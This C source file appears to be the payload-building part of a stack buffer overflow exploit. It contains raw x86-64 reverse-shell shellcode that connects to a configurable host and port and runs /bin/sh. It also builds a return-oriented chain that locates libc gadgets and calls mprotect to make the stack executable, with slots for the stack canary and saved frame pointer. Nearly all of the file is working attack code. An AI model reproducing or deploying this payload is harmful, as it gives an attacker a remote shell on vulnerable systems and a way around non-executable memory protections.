#define _GNU_SOURCE
#include <assert.h>
#include <netdb.h>	// for gethostbyname()
#include <dlfcn.h>	// for dlsym()
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "addresses.h"
#include "payload.h"
#include "strnstr.h"

static const Payload payload0 = {
	.pl_scu = {
		.raw = {
			0x6a, 0x29,					// pushq	$0x29
			0x58,						// pop		%rax
			0x99, 						// cltd
			0x6a, 0x02,					// pushq	$0x2
			0x5f,						// pop		%rdi
			0x6a, 0x01, 					// pushq	$0x1
			0x5e,						// pop		%rsi
			0x0f, 0x05,					// syscall
			0x48, 0x97,					// xchg		%rax,%rdi
			0x48, 0xb9, 0x02, 0x00,				// movabs	$0x100007fb3150002,%rcx
			0x15, 0xb3,					// .WORD	htons(5555)
			0x7f, 0x00, 0x00, 0x01,				// .DWORD	127.0.0.1
			0x51,						// push		%rcx
			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
			0x6a, 0x10,					// pushq	$0x10
			0x5a,						// pop		%rdx
			0x6a, 0x2a,					// pushq	$0x2a
			0x58,						// pop		%rax
			0x0f, 0x05,					// syscall
			0x6a, 0x03,					// pushq	$0x3
			0x5e,						// pop		%rsi
			0x48, 0xff, 0xce,				// dec		%rsi
			0x6a, 0x21,					// pushq	$0x21
			0x58,						// pop		%rax
			0x0f, 0x05,					// syscall
			0x75, 0xf6,					// jne		27<dup2_loop>
			0x6a, 0x3b,					// pushq	$0x3b
			0x58,						// pop		%rax
			0x99,						// cltd
			0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,	// movabs	$0x68732f6e69622f,%rbx
			0x73, 0x68, 0x00,				//
			0x53,						// push		%rbx
			0x48, 0x89, 0xe7,				// mov		%rsp,%rdi
			0x52,						// push		%rdx
			0x57,						// push		%rdi
			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
			0x0f, 0x05					// syscall
		} // .raw
	} // .pl_scu
}; // payload0

void initload(PayloadPtr plp) {
	*plp = payload0;
} // initload()

static ssize_t argsload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
        char s_host[256];
        unsigned short nport;
        int nc = 0, ns = sscanf(p, "%[A-Za-z0-9-.]%n:%hu%n", s_host, &nc, &nport, &nc);
        assert(ns >= 0 && ns <= 2);

        plp->pl_scu.sc.port = htons((ns > 1) ? nport : 5555);

        // See if the s_host string can be parsed by inet_aton()
        if (inet_aton(s_host, &plp->pl_scu.sc.ipAddress) == 0)
                for (struct hostent *he = gethostbyname(s_host); he; he = NULL)
                        for (int i = 0; ((struct in_addr **) he->h_addr_list)[i] != NULL; i++)
                                plp->pl_scu.sc.ipAddress = *((struct in_addr **) he->h_addr_list)[i];

        // Return number of characters consumed parsing the Host and IP Address.
        return nc;
} // argsload()

ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
	size_t libc_size	= getpagesize() * 100; // Punt

	char s_libc_popRDI[]	= {0x5f, 0xc3, 0};
	char s_libc_popRSI[]	= {0x5e, 0xc3, 0};
	char s_libc_popRDX[]	= {0x5a, 0xc3, 0};

	Pointer	libc_popRDI	= strnstr(baseAddressesPtr->libc_base, s_libc_popRDI, libc_size);
	Pointer	libc_popRSI	= strnstr(baseAddressesPtr->libc_base, s_libc_popRSI, libc_size);
	Pointer	libc_popRDX	= strnstr(baseAddressesPtr->libc_base, s_libc_popRDX, libc_size);

	Pointer	libc_mprotect	= dlsym(RTLD_NEXT, "mprotect");

	// Offsets are relative to the payload
	baseAddressesPtr->buf_base = plp;

	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));

	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B', baseAddressesPtr);
	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B', baseAddressesPtr);
	plp->pl_popRDI.o	= libc_popRDI?pointerToOffset(libc_popRDI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDI, 'P', baseAddressesPtr);
	plp->pl_stackPage.o	= pointerToOffset(baseAddressesPtr->stack_base, 'S', baseAddressesPtr);
	plp->pl_popRSI.o	= libc_popRDI?pointerToOffset(libc_popRSI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRSI, 'P', baseAddressesPtr);
	plp->pl_stackSize	= getpagesize();
	plp->pl_popRDX.o	= libc_popRDX?pointerToOffset(libc_popRDX, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDX, 'P', baseAddressesPtr);
	plp->pl_permission	= 0x7;
	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L', baseAddressesPtr);

	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B', baseAddressesPtr);

	plp->pl_scu.sc.port     = htons(5555);
	if (!inet_aton("127.0.0.1", &plp->pl_scu.sc.ipAddress))
		assert(0); // This should ALWAYS work.

	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
	int volatile v = 0;

	if (v) {
l_popRDI:	// Fallback gadget for "POP RDI"
		__asm__ ("pop %rdi");
		__asm__ ("ret");
	} // if

	if (v) {
l_popRSI:	// Fallback gadget for "POP RSI"
		__asm__ ("pop %rsi");
		__asm__ ("ret");
	} // if

	if (v) {
l_popRDX:	 // Fallback gadget for "POP RDX"
		__asm__ ("pop %rdx");
		__asm__ ("ret");
	} // if

	return argsload(plp, baseAddressesPtr, p, np);
} // makeload()

void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
	fprintf(stderr, "--------------------------------------------\n");
	fprintf(stderr, "%20s: %018p\n",	"pl_canary.p",		plp->pl_canary.p);
	fprintf(stderr, "%20s: %018p\n",	"pl_rbp.p",		plp->pl_rbp.p);
	fprintf(stderr, "%20s: %018p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
	fprintf(stderr, "%20s: %018p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
	fprintf(stderr, "%20s: %018p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
	fprintf(stderr, "%20s: %#tx\n",		"pl_stackSize",		plp->pl_stackSize);
	fprintf(stderr, "%20s: %018p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
	fprintf(stderr, "%20s: %#tx\n",		"pl_permission",	plp->pl_permission);
	fprintf(stderr, "%20s: %018p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
	fprintf(stderr, "%20s: %018p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);
	fprintf(stderr, "%20s: %d\n",		"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
	fprintf(stderr, "%20s: %s\n",		"pl_scu.sc.ipAddress",	inet_ntoa(plp->pl_scu.sc.ipAddress));
	fprintf(stderr, "--------------------------------------------\n");
} // dumpload()

